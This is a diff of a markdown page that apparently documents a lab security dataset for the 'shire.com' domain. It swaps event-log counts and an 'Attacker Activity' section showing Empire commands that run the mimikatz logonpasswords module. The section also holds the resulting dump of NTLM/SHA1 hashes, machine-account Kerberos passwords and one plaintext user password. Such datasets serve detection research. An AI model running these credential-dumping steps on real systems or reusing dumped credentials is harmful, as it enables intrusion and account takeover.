@@ -16,57 +16,83 @@ Shire
 
 ## Time Taken
 
-019-03-19130532
+2019-05-18202151
 
 ## About this file
 
 | log_name                                   | source_name                         | task                                                   |   record_number |
 |--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
-| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |            2343 |
+| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |            1558 |
 | Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               8 |
 | Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             335 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             275 |
-| Security                                   | Microsoft-Windows-Security-Auditing | User Account Management                                |             148 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |              10 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               9 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               8 |
+| System                                     | Service Control Manager             | na                                                     |               1 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             154 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             112 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              28 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |              14 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              10 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              10 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              10 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               9 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |               8 |
 | Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               8 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |               7 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               7 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |               7 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               7 |
 | Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               6 |
-| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               3 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               5 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               4 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Kernel Object                                          |               3 |
+| Security                                   | Microsoft-Windows-Security-Auditing | Directory Service Access                               |               1 |
 | Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               1 |
-| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               4 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            1520 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |            1480 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             994 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |             286 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             180 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              70 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              57 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |              24 |
-| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |              14 |
+| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               3 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             436 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             147 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             140 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             102 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              26 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              22 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               5 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               4 |
+| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               3 |
 | Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               2 |
-| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |            2426 |
-| Microsoft-Windows-DNS-Client/Operational   | Microsoft-Windows-DNS-Client        | na                                                     |             373 |
-| Microsoft-Windows-Bits-Client/Operational  | Microsoft-Windows-Bits-Client       | na                                                     |               4 |
+| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |            1735 |
 
-## Empire Activity
+## Attacker Activity
 
 ```
-usemodule credentials/mimikatz/logonpasswords*
-execute
-```
+(Empire: TKV35P8X) > usemodule credentials/mimikatz/logonpasswords*
+(Empire: powershell/credentials/mimikatz/logonpasswords) > info
 
-```
-[*] Tasked 8BLV6USC to run TASK_CMD_JOB
-[*] Agent 8BLV6USC tasked with task ID 2
-[*] Tasked agent 8BLV6USC to run module powershell/credentials/mimikatz/logonpasswords
-(Empire: powershell/credentials/mimikatz/logonpasswords) > Job started: CD6AR8
-Hostname: IT001.shire.com / S-1-5-21-2511471446-1103646877-3980648787
+              Name: Invoke-Mimikatz DumpCreds
+            Module: powershell/credentials/mimikatz/logonpasswords
+        NeedsAdmin: True
+         OpsecSafe: True
+          Language: powershell
+MinLanguageVersion: 2
+        Background: True
+   OutputExtension: None
+
+Authors:
+  @JosephBialek
+  @gentilkiwi
+
+Description:
+  Runs PowerSploit's Invoke-Mimikatz function to extract
+  plaintext credentials from memory.
+
+Comments:
+  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com
+
+Options:
+
+  Name  Required    Value                     Description
+  ----  --------    -------                   -----------
+  Agent True        TKV35P8X                  Agent to run module on.                 
+
+(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
+[*] Tasked TKV35P8X to run TASK_CMD_JOB
+[*] Agent TKV35P8X tasked with task ID 17
+[*] Tasked agent TKV35P8X to run module powershell/credentials/mimikatz/logonpasswords
+(Empire: powershell/credentials/mimikatz/logonpasswords) > Job started: TS8ARN
+Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787
 
   .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
@@ -77,183 +103,60 @@ Hostname: IT001.shire.com / S-1-5-21-2511471446-1103646877-3980648787
 
 mimikatz(powershell) # sekurlsa::logonpasswords
 
-Authentication Id : 0 ; 84172714 (00000000:05045faa)
-Session           : Interactive from 2
-User Name         : Mmidge
-Domain            : SHIRE
-Logon Server      : HFDC01
-Logon Time        : 3/19/2019 11:40:04 AM
-SID               : S-1-5-21-2511471446-1103646877-3980648787-1119
-	msv :	
-	 [00000003] Primary
-	 * Username : Mmidge
-	 * Domain   : SHIRE
-	 * NTLM     : b415baa073a14f81f8c89a2a384f4a68
-	 * SHA1     : 85e07a118d7d6f0841ae1fa5061e4bbdfa24d3a7
-	 * DPAPI    : 9375ed71838555731c26915707be9807
-	tspkg :	
-	wdigest :	
-	 * Username : Mmidge
-	 * Domain   : SHIRE
-	 * Password : (null)
-	kerberos :	
-	 * Username : Mmidge
-	 * Domain   : SHIRE.COM
-	 * Password : (null)
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 84172686 (00000000:05045f8e)
-Session           : Interactive from 2
-User Name         : Mmidge
-Domain            : SHIRE
-Logon Server      : HFDC01
-Logon Time        : 3/19/2019 11:40:04 AM
-SID               : S-1-5-21-2511471446-1103646877-3980648787-1119
-	msv :	
-	 [00000003] Primary
-	 * Username : Mmidge
-	 * Domain   : SHIRE
-	 * NTLM     : b415baa073a14f81f8c89a2a384f4a68
-	 * SHA1     : 85e07a118d7d6f0841ae1fa5061e4bbdfa24d3a7
-	 * DPAPI    : 9375ed71838555731c26915707be9807
-	tspkg :	
-	wdigest :	
-	 * Username : Mmidge
-	 * Domain   : SHIRE
-	 * Password : (null)
-	kerberos :	
-	 * Username : Mmidge
-	 * Domain   : SHIRE.COM
-	 * Password : (null)
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 84135757 (00000000:0503cf4d)
-Session           : Interactive from 2
-User Name         : DWM-2
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 3/19/2019 11:39:48 AM
-SID               : S-1-5-90-0-2
-	msv :	
-	 [00000003] Primary
-	 * Username : IT001$
-	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
-	tspkg :	
-	wdigest :	
-	 * Username : IT001$
-	 * Domain   : SHIRE
-	 * Password : (null)
-	kerberos :	
-	 * Username : IT001$
-	 * Domain   : shire.com
-	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 84135694 (00000000:0503cf0e)
-Session           : Interactive from 2
-User Name         : DWM-2
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 3/19/2019 11:39:48 AM
-SID               : S-1-5-90-0-2
-	msv :	
-	 [00000003] Primary
-	 * Username : IT001$
-	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
-	tspkg :	
-	wdigest :	
-	 * Username : IT001$
-	 * Domain   : SHIRE
-	 * Password : (null)
-	kerberos :	
-	 * Username : IT001$
-	 * Domain   : shire.com
-	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 84132167 (00000000:0503c147)
-Session           : Interactive from 2
-User Name         : UMFD-2
-Domain            : Font Driver Host
-Logon Server      : (null)
-Logon Time        : 3/19/2019 11:39:47 AM
-SID               : S-1-5-96-0-2
-	msv :	
-	 [00000003] Primary
-	 * Username : IT001$
-	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
-	tspkg :	
-	wdigest :	
-	 * Username : IT001$
-	 * Domain   : SHIRE
-	 * Password : (null)
-	kerberos :	
-	 * Username : IT001$
-	 * Domain   : shire.com
-	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 1804514 (00000000:001b88e2)
+Authentication Id : 0 ; 789700 (00000000:000c0cc4)
 Session           : Interactive from 1
-User Name         : pgustavo
+User Name         : nmartha
 Domain            : SHIRE
 Logon Server      : HFDC01
-Logon Time        : 3/11/2019 10:14:23 PM
-SID               : S-1-5-21-2511471446-1103646877-3980648787-1107
+Logon Time        : 5/14/2019 12:02:02 PM
+SID               : S-1-5-21-2511471446-1103646877-3980648787-1106
 	msv :	
 	 [00000003] Primary
-	 * Username : pgustavo
+	 * Username : nmartha
 	 * Domain   : SHIRE
-	 * NTLM     : 8ece039f32592670b45fc801e2a9157d
-	 * SHA1     : ba22a71f7aa370d915a51f3c30fc561b8ea4b95f
-	 * DPAPI    : fd5b6f36bea3f6757701cb443a46219f
+	 * NTLM     : 65f55a917b232dc6bb8e93872e458326
+	 * SHA1     : 19ed298d7b3d2c58918ebc0f4670cff5a1020d9e
+	 * DPAPI    : e28a4a7bea1950d9558f1e3a4662302a
 	tspkg :	
 	wdigest :	
-	 * Username : pgustavo
+	 * Username : nmartha
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : pgustavo
+	 * Username : nmartha
 	 * Domain   : SHIRE.COM
 	 * Password : (null)
 	ssp :	
 	credman :	
 
-Authentication Id : 0 ; 1804488 (00000000:001b88c8)
+Authentication Id : 0 ; 789663 (00000000:000c0c9f)
 Session           : Interactive from 1
-User Name         : pgustavo
+User Name         : nmartha
 Domain            : SHIRE
 Logon Server      : HFDC01
-Logon Time        : 3/11/2019 10:14:23 PM
-SID               : S-1-5-21-2511471446-1103646877-3980648787-1107
+Logon Time        : 5/14/2019 12:02:02 PM
+SID               : S-1-5-21-2511471446-1103646877-3980648787-1106
 	msv :	
 	 [00000003] Primary
-	 * Username : pgustavo
+	 * Username : nmartha
 	 * Domain   : SHIRE
-	 * NTLM     : 8ece039f32592670b45fc801e2a9157d
-	 * SHA1     : ba22a71f7aa370d915a51f3c30fc561b8ea4b95f
-	 * DPAPI    : fd5b6f36bea3f6757701cb443a46219f
+	 * NTLM     : 65f55a917b232dc6bb8e93872e458326
+	 * SHA1     : 19ed298d7b3d2c58918ebc0f4670cff5a1020d9e
+	 * DPAPI    : e28a4a7bea1950d9558f1e3a4662302a
 	tspkg :	
 	wdigest :	
-	 * Username : pgustavo
+	 * Username : nmartha
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : pgustavo
+	 * Username : nmartha
 	 * Domain   : SHIRE.COM
 	 * Password : (null)
 	ssp :	
+	 [00000000]
+	 * Username : pgustavo
+	 * Domain   : shire
+	 * Password : W1n1!19
 	credman :	
 
 Authentication Id : 0 ; 997 (00000000:000003e5)
@@ -261,7 +164,7 @@ Session           : Service from 0
 User Name         : LOCAL SERVICE
 Domain            : NT AUTHORITY
 Logon Server      : (null)
-Logon Time        : 3/11/2019 9:00:04 PM
+Logon Time        : 5/3/2019 3:14:44 AM
 SID               : S-1-5-19
 	msv :	
 	tspkg :	
@@ -276,144 +179,144 @@ SID               : S-1-5-19
 	ssp :	
 	credman :	
 
-Authentication Id : 0 ; 63616 (00000000:0000f880)
+Authentication Id : 0 ; 63941 (00000000:0000f9c5)
 Session           : Interactive from 1
 User Name         : DWM-1
 Domain            : Window Manager
 Logon Server      : (null)
-Logon Time        : 3/11/2019 8:58:33 PM
+Logon Time        : 5/3/2019 3:14:43 AM
 SID               : S-1-5-90-0-1
 	msv :	
 	 [00000003] Primary
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
+	 * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
+	 * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
 	tspkg :	
 	wdigest :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : shire.com
-	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
+	 * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
 	ssp :	
 	credman :	
 
-Authentication Id : 0 ; 63559 (00000000:0000f847)
+Authentication Id : 0 ; 62725 (00000000:0000f505)
 Session           : Interactive from 1
 User Name         : DWM-1
 Domain            : Window Manager
 Logon Server      : (null)
-Logon Time        : 3/11/2019 8:58:33 PM
+Logon Time        : 5/3/2019 3:14:43 AM
 SID               : S-1-5-90-0-1
 	msv :	
 	 [00000003] Primary
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
+	 * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
+	 * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
 	tspkg :	
 	wdigest :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : shire.com
-	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
+	 * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
 	ssp :	
 	credman :	
 
 Authentication Id : 0 ; 996 (00000000:000003e4)
 Session           : Service from 0
-User Name         : IT001$
+User Name         : HR001$
 Domain            : SHIRE
 Logon Server      : (null)
-Logon Time        : 3/11/2019 8:58:17 PM
+Logon Time        : 5/3/2019 3:14:43 AM
 SID               : S-1-5-20
 	msv :	
 	 [00000003] Primary
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
+	 * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
+	 * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
 	tspkg :	
 	wdigest :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : it001$
+	 * Username : hr001$
 	 * Domain   : SHIRE.COM
 	 * Password : (null)
 	ssp :	
 	credman :	
 
-Authentication Id : 0 ; 40805 (00000000:00009f65)
+Authentication Id : 0 ; 39974 (00000000:00009c26)
 Session           : Interactive from 0
 User Name         : UMFD-0
 Domain            : Font Driver Host
 Logon Server      : (null)
-Logon Time        : 3/11/2019 8:58:04 PM
+Logon Time        : 5/3/2019 3:14:41 AM
 SID               : S-1-5-96-0-0
 	msv :	
 	 [00000003] Primary
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
+	 * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
+	 * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
 	tspkg :	
 	wdigest :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : shire.com
-	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
+	 * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
 	ssp :	
 	credman :	
 
-Authentication Id : 0 ; 40613 (00000000:00009ea5)
+Authentication Id : 0 ; 39911 (00000000:00009be7)
 Session           : Interactive from 1
 User Name         : UMFD-1
 Domain            : Font Driver Host
 Logon Server      : (null)
-Logon Time        : 3/11/2019 8:58:04 PM
+Logon Time        : 5/3/2019 3:14:41 AM
 SID               : S-1-5-96-0-1
 	msv :	
 	 [00000003] Primary
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
+	 * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
+	 * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
 	tspkg :	
 	wdigest :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : shire.com
-	 * Password : dFK-5\;zQ5LfJu.+,?sywo9AfG;g_z0'bfgx1Ce]^lNE&mZS;B-OEKK^1[E]+4bKA$WgCj 0f.*bhGdg=0KeSK' H*VY9l!@4ooDV$]$2yM`j/jXEKCp]KMZ
+	 * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
 	ssp :	
 	credman :	
 
-Authentication Id : 0 ; 39288 (00000000:00009978)
+Authentication Id : 0 ; 37663 (00000000:0000931f)
 Session           : UndefinedLogonType from 0
 User Name         : (null)
 Domain            : (null)
 Logon Server      : (null)
-Logon Time        : 3/11/2019 8:57:53 PM
+Logon Time        : 5/3/2019 3:14:40 AM
 SID               : 
 	msv :	
 	 [00000003] Primary
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
-	 * NTLM     : 5c03a8bf5d1c76899fbd1ee4178574b8
-	 * SHA1     : 1bafcdcc855ae86e06ac39b278243a7990dcb493
+	 * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
+	 * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
 	tspkg :	
 	wdigest :	
 	kerberos :	
@@ -422,19 +325,19 @@ SID               :
 
 Authentication Id : 0 ; 999 (00000000:000003e7)
 Session           : UndefinedLogonType from 0
-User Name         : IT001$
+User Name         : HR001$
 Domain            : SHIRE
 Logon Server      : (null)
-Logon Time        : 3/11/2019 8:57:43 PM
+Logon Time        : 5/3/2019 3:14:40 AM
 SID               : S-1-5-18
 	msv :	
 	tspkg :	
 	wdigest :	
-	 * Username : IT001$
+	 * Username : HR001$
 	 * Domain   : SHIRE
 	 * Password : (null)
 	kerberos :	
-	 * Username : it001$
+	 * Username : hr001$
 	 * Domain   : SHIRE.COM
 	 * Password : (null)
 	ssp :	
